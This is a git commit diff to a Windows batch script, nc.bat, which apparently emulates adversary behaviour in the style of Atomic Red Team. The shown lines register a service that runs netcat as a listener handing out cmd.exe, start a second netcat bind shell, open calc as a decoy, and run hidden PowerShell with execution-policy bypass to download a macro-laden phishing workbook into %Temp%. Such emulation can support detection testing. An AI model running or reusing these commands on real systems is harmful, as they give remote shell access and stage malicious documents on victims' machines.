26927217d5e8341a36bb3960b9f6d945d66bc1c5
inwestallis <inwestallis@gmail.com>
2020-02-29 12:04:37 +0300

    Update nc.bat

--- nc.bat
+++ nc.bat
@@ -11,6 +11,6 @@ sc create XSample binPath= "cmd.exe /C %Temp%\nc64.exe -nLvp 4467 -e cmd.exe" st
 
 start calc
 
-powershell.exe -windowstyle hidden -ep Bypass -nop -noexit -Command "(New-Object System.Net.WebClient).DownloadFile('https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1193/bin/PhishingAttachment.xlsm?raw=true', 'C:\tools\s.xlsm')"
+powershell.exe -windowstyle hidden -ep Bypass -nop -noexit -Command "(New-Object System.Net.WebClient).DownloadFile('https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1193/bin/PhishingAttachment.xlsm?raw=true','%Temp%\s.xlsm')"
 
 %Temp%\nc64.exe -nLvp 4466 -e cmd.exe
